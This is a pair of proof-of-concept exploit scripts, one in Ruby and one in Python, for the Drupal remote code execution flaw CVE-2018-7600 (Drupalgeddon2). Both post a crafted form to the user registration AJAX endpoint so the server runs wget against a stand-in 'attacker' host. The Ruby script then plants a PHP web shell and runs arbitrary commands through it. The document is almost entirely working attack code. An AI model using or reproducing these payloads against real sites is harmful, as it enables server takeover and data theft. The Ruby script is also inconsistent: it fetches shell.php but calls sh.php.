  
 # Hans Topo ruby port from Drupalggedon2 exploit. 
 # Based on Vitalii Rudnykh exploit 
  
 target = ARGV[0] 
 command = ARGV[1] 
  
 url = target + &#039;/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax&#039; 
  
 shell = "<?php system($_GET[&#039;cmd&#039;]); ?>" 
  
 payload = &#039;mail%5B%23markup%5D%3Dwget%20http%3A%2F%2Fattacker%2Fshell.php%26mail%5B%23type%5D%3Dmarkup%26form_id%3Duser_register_form%26_drupal_ajax%3D1%26mail%5B%23post_render%5D%5B%5D%3Dexec&#039; 
  
 uri = URI(url) 
  
 http = Net::HTTP.new(uri.host,uri.port) 
  
 if uri.scheme == &#039;https&#039; 
 	http.use_ssl = true 
 	http.verify_mode = OpenSSL::SSL::VERIFY_NONE 
 end 
  
 req = Net::HTTP::Post.new(uri.path) 
 req.body = payload 
  
 response = http.request(req) 
  
 if response.code != "200" 
 	puts "[*] Response: " + response.code 
 	puts "[*] Target seems not to be exploitable" 
 	exit 
 end 
  
 puts "[*] Target seems to be exploitable." 
  
 exploit_uri = URI(target+"/sh.php?cmd=#{command}") 
 response = Net::HTTP.get_response(exploit_uri) 
 puts response.body

----------------------Exploit PoC 2---------------------------

 import sys 
 import requests 
  
 print (&#039;################################################################&#039;) 
 print (&#039;# Proof-Of-Concept for CVE-2018-7600&#039;) 
 print (&#039;# by Vitalii Rudnykh&#039;) 
 print (&#039;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#039;) 
 print (&#039;# https://github.com/a2u/CVE-2018-7600&#039;) 
 print (&#039;################################################################&#039;) 
 print (&#039;Provided only for educational or information purposes\n&#039;) 
  
 target = raw_input(&#039;Enter target url (example: https://domain.ltd/): &#039;) 
  
 url = target + &#039;user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax&#039;  
 payload = {&#039;form_id&#039;: &#039;user_register_form&#039;, &#039;_drupal_ajax&#039;: &#039;1&#039;, &#039;mail[#post_render][]&#039;: &#039;exec&#039;, &#039;mail[#type]&#039;: &#039;markup&#039;, &#039;mail[#markup]&#039;: &#039;wget http://attacker/hello.txt&#039;} 
  
 r = requests.post(url, data=payload) 
 if r.status_code != 200: 
   sys.exit("Not exploitable") 
 print (&#039;\nCheck: &#039;+target+&#039;hello.txt&#039;)

